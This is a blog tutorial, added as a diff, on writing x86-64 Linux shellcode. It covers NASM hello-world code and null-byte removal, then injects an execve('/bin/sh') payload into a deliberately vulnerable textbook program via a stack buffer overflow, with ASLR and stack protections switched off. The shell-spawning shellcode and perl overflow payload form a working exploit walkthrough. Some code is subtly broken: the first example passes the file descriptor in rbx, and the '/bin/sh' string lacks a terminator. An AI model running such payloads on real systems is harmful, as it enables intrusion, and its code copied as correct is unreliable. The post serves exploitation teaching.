@@ -1,0 +1,307 @@
+#+title: Write your own shellcode
+#+description: todo
+#+publishdate: 2024-10-24
+#+cover: ../../images/covers/write-shellcode.png
+#+options: ^:nil
+
+* What's a shellcode?
+
+In the software realm, a shellcode is a set of instructions that attackers inject into a program to execute arbitrary commands. Commonly, they use it to spawn a shell. However, you can do whatever you wish to. For example, print something to stdout, create files, and open a port, to name a few.
+
+In this post, I will show you the basics of building a shellcode and how to avoid the most common pitfalls when executing it in an exploit.
+
+
+* Building a shellcode
+
+A shellcode is built in assembly. Why assembly? Because they are injected into running programs that are already compiled, assembled, and linked. Once in runtime, the CPU is just reading machine instructions. Thus, we need to inject assembly instructions.
+
+Building an assembly program can seem hard but there are lots of resources where you can learn about it.
+
+- https://github.com/mschwartz/assembly-tutorial?tab=readme-ov-file
+- https://nasm.us/docs.php
+- https://learnxinyminutes.com/docs/mips/
+- https://cs.lmu.edu/~ray/notes/nasmtutorial/
+- https://portal.cs.umbc.edu/help/nasm/sample_64.shtml
+
+You must also know where to get the machine instructions for a given architecture. You can get the information from the system. For example, my 64-bit Linux machine has the file ~/usr/include/x86_64-linux-gnu/asm/unistd_64.h~ with the information.
+
+#+begin_src C
+#ifndef _ASM_UNISTD_64_H
+#define _ASM_UNISTD_64_H
+
+#define __NR_read 0
+#define __NR_write 1
+#define __NR_open 2
+#define __NR_close 3
+#define __NR_stat 4
+#+end_src
+
+Alternatively, you can search for that information on the Internet, for example, https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ or https://j00ru.vexillium.org/syscalls/nt/64/.
+
+Let's start writing a simple program to print to the stdout.
+
+** Hello world assembly
+
+
+#+begin_src nasm
+BITS 64 ; Define target architecture bits
+
+section .data ; Data segment
+msg db "Hello, world!", 0x0a; String with new line char
+
+section .text ; Text segment
+global _start; Default entry point for ELF linking
+
+_start:
+
+; write
+mov rax, 1 ; Specify write syscall
+mov rbx, 1 ; Specify stdout by putting 1 into rbx
+mov rsi, msg ; Put the address of the string into rsi
+mov rdx, 14 ; Put the length of the string into rdx
+syscall ; Execute the system call
+
+; exit
+mov rax, 60 ; Specify exit syscall
+mov rbx, 0 ; Exit with success
+syscall ; Execute the system call
+#+end_src
+
+The program is simple. We define the target architecture bits, create a static string, and print it into stdout. Assembling, linking, and executing the binary is also very simple.
+
+#+begin_src bash
+nasm -f elf64 helloworld.asm
+ld helloworld.o
+./a.out
+#+end_src
+
+See how it works and experiment a bit.
+
+Taking that program as a basis, we will now see the different restrictions that we have to build a fully functional shellcode.
+
+** No segments
+
+We inject shellcodes into running programs. Hence, we cannot specify the data layout nor use other data segments like in the previous example. The instructions must be self-contained. For instance, we cannot declare a static string. We need to mix it with the other instructions.
+
+Removing the segments is easy, but... how can we mix the string? The stack will be our ally. Remember that when calling a function, a stack frame is created with the arguments, the local variables, and the return address. We can misuse that in assembly to load a string. The idea is to place the string directly after a call instruction. That way the return address of the stack will match the address of the string and we will be able to retrieve it inside the function.
+
+#+begin_src nasm
+BITS 64
+
+call below
+db "Hello, world!", 0x0a
+
+below:
+; write
+mov rax, 1
+mov rdi, 1
+; Pop the value from the return address 
+; and store it into the register
+pop rsi 
+mov rdx, 14
+syscall
+
+; exit
+mov rax, 60
+mov rdi, 0
+syscall
+#+end_src
+
+Try it out and experiment with it.
+
+In some situations that's the only technique you will need to inject a shellcode. However, there are some occasions where this may fall short and you will get a segmentation fault. Often, shellcodes are injected as strings with functions like ~strcpy~. These types of functions terminate at the first null byte. If we want it to work as expected, we must remove the null bytes.
+
+** No null bytes
+
+There are different techniques to remove null bytes. Let's see our starting point.
+
+#+begin_src
+  nasm helloworld.asm
+  hexdump -C helloword
+#+end_src
+
+[[../../images/write-your-own-shell/hexdump-t0.png]]
+
+Notice how many ~00~ are there. These are the null bytes.
+
+*** Jump to the end and back
+
+~call~ instructions allow for "long" jumps. Using it for "small" jumps as we are doing in our shellcode means that the operand doesn't fill the entire space reserved for the operand value, and it gets padded with null bytes.
+
+We can us the two's complement to avoid that. If we pass a negative number to the ~call~ instruction, the value will be padded with ~0xff~ instead of null bytes. A standard implementation of this solution consists of jumping to the end of the assembly program to a ~call~ instruction that will jump back to a function.
+
+#+begin_src nasm
+BITS 64
+
+jmp short bottom
+
+above:
+; write
+mov rax, 1
+mov rdi, 1
+pop rsi
+mov rdx, 14
+syscall
+
+; exit
+mov rax, 60
+mov rdi, 0
+syscall
+
+bottom:
+call above
+db "Hello, world!", 0x0a
+#+end_src
+
+[[../../images/write-your-own-shell/hexdump-t1.png]]
+
+We removed some null bytes.
+
+*** Use smaller registers
+
+Computers have 16 registers. 64-bit registers are built on top of old registers. For instance, EAX is part of RAX and it contains its first 32 bits.
+
+| 64-bit register | Lower 32 bits | Lower 16 bits | Lower 8 bits |
+|-----------------+---------------+---------------+--------------|
+| rax             | eax           | ax            | al           |
+| rbx             | ebx           | bx            | bl           |
+| rcx             | ecx           | cx            | cl           |
+| rdx             | edx           | dx            | dl           |
+| rsi             | esi           | si            | sil          |
+| rdi             | edi           | di            | dil          |
+| rbp             | ebp           | bp            | bpl          |
+| rsp             | esp           | sp            | spl          |
+| r8              | r8d           | r8w           | r8b          |
+| r9              | r9d           | r9w           | r9b          |
+| r10             | r10d          | r10w          | r10b         |
+| r11             | r11d          | r11w          | r11b         |
+| r12             | r12d          | r12w          | r12b         |
+| r13             | r13d          | r13w          | r13b         |
+| r14             | r14d          | r14w          | r14b         |
+| r15             | r15d          | r15w          | r15b         |
+
+When using bigger registers, values are padded with null bytes if they can't fill the space. Therefore, we want to use the smallest register possible in each operation. However, the remaining bytes can contain any data. We need to zero them out. This can be easily achieved with the xor operation. Additionally, calling ~mov register, 0~ adds null bytes. We need to use ~dec register~.
+
+#+begin_src nasm
+BITS 64
+
+jmp short bottom
+
+above:
+; write
+xor rax, rax
+inc al
+xor rdi, rdi
+inc rdi
+pop rsi
+xor rdx, rdx
+mov dl, 14
+syscall
+
+; exit
+mov al, 60
+dec rdi
+syscall
+
+bottom:
+call above
+db "Hello, world!", 0x0a
+#+end_src
+
+[[../../images/write-your-own-shell/hexdump-t2.png]]
+
+We removed all the null bytes!!! This is it. Shellcodes are just a matter of executing system calls and avoiding null bytes. Let's try it out with a hands-on exercise.
+
+* Experiment with shellcode injection
+
+Relevant system information:
+
+- Linux 5.15.0-122-generic x86_64
+- Intel(R) Core(TM) i7-10510U CPU
+- Little Endian
+- 48 bits address size
+
+All the vulnerable programs are from Hacking: The Art of Exploitation, 2nd Edition. Get the source code from https://github.com/intere/hacking/blob/master/booksrc.
+
+We will use two programs from the book: ~getenvaddr.c~ and ~notesearch.c~ (that requires ~hacking.h~). We will store the shellcode in an environment variable and inject it into the vulnerable program with a stack-based buffer overflow. If you want to learn more about stack-based buffer overflows and how to take advantage of the environment, you can check [[../stack-based-buffer-overflows][Stack-based buffer overflows]] and [[../store-shellcode-in-environment-variable][Store shellcode in environment variable]].
+
+Let's compile the programs. Notice how we disable all the security measures for the vulnerable program.
+
+#+begin_src bash
+gcc getenvaddr.c -o getenvaddr
+gcc notesearch.c -o notesearch -fno-stack-protector -z execstack -no-pie -g
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+#+end_src
+
+Now, we have to:
+
+1. Assemble the shellcode
+2. Export the shellcode into an environment variable
+3. Check the address of the environment variable from the vulnerable program point of view
+4. Inject the code into the vulnerable program
+
+Which translates into the following.
+
+#+begin_src bash
+nasm helloworld.asm
+export SHELLCODE=$(cat helloworld)
+~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch
+~/Desktop/notesearch $(perl -e 'print "\x90" x 120, "\xab\xef\xff\xff\xff\x7f\x00\x00"')
+#+end_src
+
+[[../../images/write-your-own-shell/write-stdout-exploit.png]]
+
+Cool! We managed to take control of the program and print what we wanted to the stdout.
+This is rather dull. Let's try to get a shell prompt!!!
+
+What would this look like in C?
+
+#+begin_src C
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+    system("/bin/sh");
+}
+#+end_src
+
+You can try it out with ~gcc shell.c -o shell; chmod +x shell; ./shell~.
+
+If you search on the internet, you will find that [[https://man7.org/linux/man-pages/man3/system.3.html][system]] internally calls [[https://man7.org/linux/man-pages/man3/execl.3.html][execl]], which is build on top of the [[https://man7.org/linux/man-pages/man2/execve.2.html][execve]] system call. Execve receives three parameters: the program, the argument to the program, and key-value pairs to be passed as the environment. In our case, to spawn a shell, we are only interested in the first argument. Overall, building an assembly program that spawns a shell seems easy. Just call ~execve~ with ~/bin/sh~ as the program name.
+
+#+begin_src nasm
+BITS 64
+
+jmp short bottom
+
+above:
+; write
+xor rax, rax
+mov al, 59
+xor rdi, rdi
+pop rdi
+xor rsi, rsi
+xor rdx, rdx
+syscall
+
+; exit
+mov al, 60
+dec rdi
+syscall
+
+bottom:
+call above
+db "/bin/sh"
+#+end_src
+
+Let's try to inject it.
+
+#+begin_src bash
+nasm shell.asm; \
+export SHELLCODE=$(cat shell); \
+~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch; \
+~/Desktop/notesearch $(perl -e 'print "\x90" x 120, "\xb3\xef\xff\xff\xff\x7f\x00\x00"')
+#+end_src
+
+[[../../images/write-your-own-shell/shell-exploit.png]]
+
+We got shell access!!! 
